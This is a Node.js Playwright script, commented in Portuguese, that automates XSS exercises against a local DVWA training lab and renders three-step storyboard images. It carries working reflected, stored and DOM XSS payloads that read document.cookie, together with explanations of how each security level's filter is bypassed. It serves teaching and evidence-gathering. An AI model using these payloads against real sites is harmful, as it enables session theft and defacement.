/**
 * DVWA XSS — Storyboards explicativos (3 passos por tipo).
 *
 * Para o cenario representativo de cada tipo (Reflected/Stored/DOM), monta um
 * fluxo numerado: (1) entrada do payload, (2) resposta do servidor / DOM gerado,
 * (3) execucao no navegador. Gera STORY_1_reflected.png, STORY_2_stored.png e
 * STORY_3_dom.png. Nao sobrescreve os PRINT_* antigos.
 *
 * Uso (na pasta xss-evidence, com DVWA rodando):
 *   node storyboard.js
 */

const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');

const BASE = (process.env.DVWA_URL || 'http://localhost:4280').replace(/\/$/, '');
const USER = process.env.DVWA_USER || 'admin';
const PASS = process.env.DVWA_PASS || 'password';
const HEADED = process.env.HEADED === '1';

const OUT = path.join(__dirname, 'output');
fs.mkdirSync(OUT, { recursive: true });

const TYPE_LABEL = {
  reflected: 'Reflected XSS (xss_r)',
  stored: 'Stored XSS (xss_s)',
  dom: 'DOM-based XSS (xss_d)',
};
const FILE = { reflected: 'STORY_1_reflected', stored: 'STORY_2_stored', dom: 'STORY_3_dom' };

// Cenario representativo por tipo (o mais ilustrativo)
const REPS = [
  {
    type: 'reflected', level: 'high',
    payload: '<svg/onload=alert(document.cookie)>',
    others: 'Low: <script>alert(document.cookie)</script>   ·   Medium: <img src=x onerror=alert(document.cookie)>',
  },
  {
    type: 'stored', level: 'medium', field: 'name',
    payload: '<img src=x onerror=alert(document.cookie)>',
    others: 'Low: <script>...</script> no campo Message   ·   High: <svg/onload=...> no campo Name',
  },
  {
    type: 'dom', level: 'high', fragment: true,
    payload: 'English#<script>alert(document.cookie)</script>',
    others: 'Low: ?default=<script>...</script>   ·   Medium: ?default=</option></select><img onerror=...>',
  },
];

const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
// destaca o payload (ja escapado) dentro de um trecho (ja escapado)
function highlight(escSnippet, escPayload) {
  if (!escPayload) return escSnippet;
  return escSnippet.split(escPayload).join('<mark>' + escPayload + '</mark>');
}

async function login(context) {
  const page = await context.newPage();
  await page.goto(`${BASE}/login.php`, { waitUntil: 'domcontentloaded' });
  await page.fill('input[name="username"]', USER);
  await page.fill('input[name="password"]', PASS);
  await Promise.all([
    page.waitForLoadState('domcontentloaded'),
    page.click('button[type="submit"], input[type="submit"], [name="Login"]'),
  ]);
  const ok = !/login\.php/.test(page.url());
  await page.close();
  if (!ok) throw new Error('Login falhou. Verifique o DVWA e se o banco foi criado.');
}

async function setSecurity(context, level) {
  await context.addCookies([{ name: 'security', value: level, url: BASE }]);
}

async function clearGuestbook(context) {
  await context.request.post(`${BASE}/vulnerabilities/xss_s/`, { form: { btnClear: 'Clear Guestbook' } }).catch(() => {});
}

async function topShot(page, file) {
  await page.screenshot({ path: file, clip: { x: 0, y: 0, width: 1000, height: 470 } });
}

async function injectMiniBanner(page, alertMsg) {
  await page.evaluate((alertMsg) => {
    const b = document.createElement('div');
    b.style.cssText =
      'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#0b6b2f;color:#fff;' +
      'font:600 14px Consolas,monospace;padding:8px 12px;border-bottom:3px solid #063d1a';
    b.textContent = 'alert() executou — conteudo de document.cookie: ' + (alertMsg || '(vazio)');
    document.body.insertBefore(b, document.body.firstChild);
    document.body.style.paddingTop = '40px';
  }, alertMsg);
}

async function capture(context, rep) {
  await setSecurity(context, rep.level);
  const page = await context.newPage();
  const dialogs = [];
  page.on('dialog', async (d) => { dialogs.push(d.message()); await d.accept().catch(() => {}); });

  const step = { type: rep.type, level: rep.level, payload: rep.payload, others: rep.others };

  if (rep.type === 'reflected') {
    const url = `${BASE}/vulnerabilities/xss_r/?name=${encodeURIComponent(rep.payload)}`;
    step.entryLabel = 'Payload no parametro GET <code>name</code>';
    step.entryKind = 'url';
    step.entryValue = `${BASE}/vulnerabilities/xss_r/?name=${rep.payload}`;
    // (2) resposta crua do servidor
    const raw = await (await context.request.get(url)).text();
    const m = raw.match(/<pre>Hello[\s\S]*?<\/pre>/i);
    step.step2Label = 'Resposta do servidor (HTML refletido, sem codificacao)';
    step.step2Blocks = [{ code: m ? m[0] : '(trecho nao encontrado)' }];
    step.step2Note = 'O filtro de High remove variacoes de <script> por regex, mas nao alcanca o atributo de evento onload do <svg>.';
    // (3) execucao
    await page.goto(url, { waitUntil: 'load' }).catch(() => {});
    await page.waitForTimeout(600);
  } else if (rep.type === 'stored') {
    await clearGuestbook(context);
    const form = { txtName: rep.payload, mtxMessage: 'evidencia', btnSign: 'Sign Guestbook' };
    await context.request.post(`${BASE}/vulnerabilities/xss_s/`, { form });
    step.entryLabel = 'Payload gravado via POST no campo Name (POST ignora o maxlength=10 do cliente)';
    step.entryKind = 'form';
    step.entryValue = `Name:    ${rep.payload}\nMessage: evidencia`;
    const url = `${BASE}/vulnerabilities/xss_s/`;
    const raw = await (await context.request.get(url)).text();
    const dm = raw.match(/<div id="guestbook_comments">([\s\S]*?)<\/div>/i);
    let snippet = dm ? dm[1].trim() : '(trecho nao encontrado)';
    snippet = snippet.replace(/<br\s*\/?>/gi, '\n').replace(/\n{2,}/g, '\n').trim();
    step.step2Label = 'Persistencia: o payload fica gravado no guestbook e executa a cada visita';
    step.step2Blocks = [{ code: snippet }];
    step.step2Note = 'No Medium o campo Message e blindado (strip_tags + htmlspecialchars); o campo Name so remove a string literal <script>, deixando <img onerror> passar.';
    await page.goto(url, { waitUntil: 'load' }).catch(() => {});
    await page.waitForTimeout(600);
  } else {
    // dom high (fragmento)
    const [b, frag] = rep.payload.split('#');
    const url = `${BASE}/vulnerabilities/xss_d/?default=${encodeURI(b)}#${encodeURI(frag)}`;
    step.entryLabel = 'Payload no fragmento da URL (apos #). O fragmento nao trafega ao servidor (RFC 3986)';
    step.entryKind = 'url';
    step.entryValue = `${BASE}/vulnerabilities/xss_d/?default=${rep.payload}`;
    // (2a) servidor NAO ve o fragmento
    const rawUrl = `${BASE}/vulnerabilities/xss_d/?default=English`;
    const raw = await (await context.request.get(rawUrl)).text();
    const seesPayload = /alert\(document\.cookie\)/.test(raw);
    // (2b) DOM gerado no cliente
    await page.goto(url, { waitUntil: 'load' }).catch(() => {});
    await page.waitForTimeout(600);
    const sel = await page.evaluate(() => {
      const s = document.querySelector('form[name="XSS"] select');
      return s ? s.outerHTML : '(select nao encontrado)';
    });
    step.step2Label = 'Servidor x cliente: o servidor so recebe default=English; o JavaScript le location.href inteira e injeta via document.write';
    step.step2Blocks = [
      { tag: 'Requisicao vista pelo servidor (sem o payload)', code: 'GET /vulnerabilities/xss_d/?default=English\n(payload presente na resposta: ' + (seesPayload ? 'sim' : 'NAO') + ')' },
      { tag: 'DOM gerado no navegador (com o payload)', code: sel.length > 600 ? sel.slice(0, 600) + ' ...' : sel },
    ];
    step.step2Note = 'A whitelist server-side valida apenas English; o vetor vive no fragmento, fora do alcance de qualquer filtro de servidor.';
  }

  step.alertMsg = dialogs[0] || '';
  const shotFile = path.join(OUT, `_step3_${rep.type}.png`);
  await injectMiniBanner(page, step.alertMsg);
  await topShot(page, shotFile);
  step.step3Shot = shotFile;
  await page.close();
  console.log(`captura ${rep.type}/${rep.level}: alert=${step.alertMsg ? '"' + step.alertMsg + '"' : 'vazio'}`);
  return step;
}

function urlBarHtml(value) {
  return `<div class="urlbar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="addr">${esc(value)}</span></div>`;
}

function renderStory(step) {
  const escPayload = esc(step.payload);
  const entry = step.entryKind === 'url'
    ? urlBarHtml(step.entryValue)
    : `<pre class="code">${highlight(esc(step.entryValue), escPayload)}</pre>`;

  const step2 = step.step2Blocks.map((bk) =>
    (bk.tag ? `<div class="tag">${esc(bk.tag)}</div>` : '') +
    `<pre class="code">${highlight(esc(bk.code), escPayload)}</pre>`
  ).join('');

  const shotUri = 'data:image/png;base64,' + fs.readFileSync(step.step3Shot).toString('base64');
  const cookieNote = step.alertMsg
    ? `alert() exibiu <code>${esc(step.alertMsg)}</code>. O identificador de sessao <code>PHPSESSID</code> nao aparece porque e <code>HttpOnly</code>.`
    : `alert() executou (XSS confirmado). O <code>document.cookie</code> veio vazio: os cookies sao <code>HttpOnly</code>.`;

  return `<!doctype html><html><head><meta charset="utf-8"><style>
    *{box-sizing:border-box}
    body{margin:0;background:#fff;width:1040px;font-family:Segoe UI,Arial,sans-serif;color:#1a1a1a}
    .title{font-size:21px;font-weight:700;margin:18px 22px 4px}
    .sub{font-size:13px;color:#555;margin:0 22px 14px}
    .step{margin:0 22px 8px;border:1px solid #d9d9d9;border-radius:10px;overflow:hidden}
    .head{display:flex;align-items:center;gap:10px;background:#0b6b2f;color:#fff;padding:9px 14px}
    .num{flex:0 0 26px;height:26px;border-radius:50%;background:#fff;color:#0b6b2f;font-weight:800;
         display:flex;align-items:center;justify-content:center;font-size:15px}
    .head .lbl{font-size:14px;font-weight:600;line-height:1.3}
    .body{padding:12px 14px}
    .code{margin:0;background:#1e1e1e;color:#e6e6e6;padding:10px 12px;border-radius:7px;
          font:13px/1.5 Consolas,monospace;white-space:pre-wrap;word-break:break-word}
    mark{background:#ffe14d;color:#1e1e1e;padding:0 2px;border-radius:2px}
    .note{font-size:13px;color:#333;margin-top:8px;line-height:1.45}
    .tag{font-size:12px;font-weight:700;color:#0b6b2f;margin:8px 0 4px}
    .tag:first-child{margin-top:0}
    .urlbar{display:flex;align-items:center;gap:7px;background:#efefef;border:1px solid #ccc;
            border-radius:20px;padding:7px 14px;font:13px Consolas,monospace}
    .dot{width:11px;height:11px;border-radius:50%;display:inline-block}
    .dot.r{background:#ff5f57}.dot.y{background:#febc2e}.dot.g{background:#28c840}
    .addr{margin-left:6px;word-break:break-all;color:#222}
    .arrow{text-align:center;color:#0b6b2f;font-size:20px;line-height:1;margin:2px 0}
    .shot{display:block;width:100%;border:1px solid #ccc;border-radius:7px}
    .others{margin:10px 22px 18px;font-size:12.5px;color:#555;background:#f6f6f6;
            border-left:4px solid #0b6b2f;padding:8px 12px;border-radius:0 6px 6px 0}
    code{background:#f0f0f0;border-radius:3px;padding:0 4px;font-family:Consolas,monospace}
  </style></head><body>
    <div class="title">${TYPE_LABEL[step.type]} — demonstracao em 3 passos (nivel ${step.level.toUpperCase()})</div>
    <div class="sub">Payload: <code>${escPayload}</code></div>

    <div class="step"><div class="head"><div class="num">1</div><div class="lbl">${step.entryLabel}</div></div>
      <div class="body">${entry}</div></div>
    <div class="arrow">&#9660;</div>

    <div class="step"><div class="head"><div class="num">2</div><div class="lbl">${step.step2Label}</div></div>
      <div class="body">${step2}<div class="note">${esc(step.step2Note)}</div></div></div>
    <div class="arrow">&#9660;</div>

    <div class="step"><div class="head"><div class="num">3</div><div class="lbl">Execucao no navegador</div></div>
      <div class="body"><img class="shot" src="${shotUri}"/><div class="note">${cookieNote}</div></div></div>

    <div class="others"><b>Outros niveis deste tipo:</b> ${esc(step.others)}</div>
  </body></html>`;
}

(async () => {
  console.log(`Alvo: ${BASE}`);
  const browser = await chromium.launch({ headless: !HEADED });
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  try {
    await login(context);
    const steps = [];
    for (const rep of REPS) steps.push(await capture(context, rep));

    for (const step of steps) {
      const html = renderStory(step);
      const page = await context.newPage();
      await page.setViewportSize({ width: 1040, height: 900 });
      await page.setContent(html, { waitUntil: 'load' });
      const out = path.join(OUT, `${FILE[step.type]}.png`);
      await page.screenshot({ path: out, fullPage: true });
      await page.close();
      console.log(`storyboard gerado: ${out}`);
    }
    // limpa os recortes intermediarios
    for (const f of fs.readdirSync(OUT)) if (f.startsWith('_step3_')) fs.unlinkSync(path.join(OUT, f));
    console.log('\nConcluido. Prints: STORY_1_reflected.png, STORY_2_stored.png, STORY_3_dom.png');
  } catch (e) {
    console.error('FALHA:', e.message);
    process.exitCode = 1;
  } finally {
    await context.close();
    await browser.close();
  }
})();
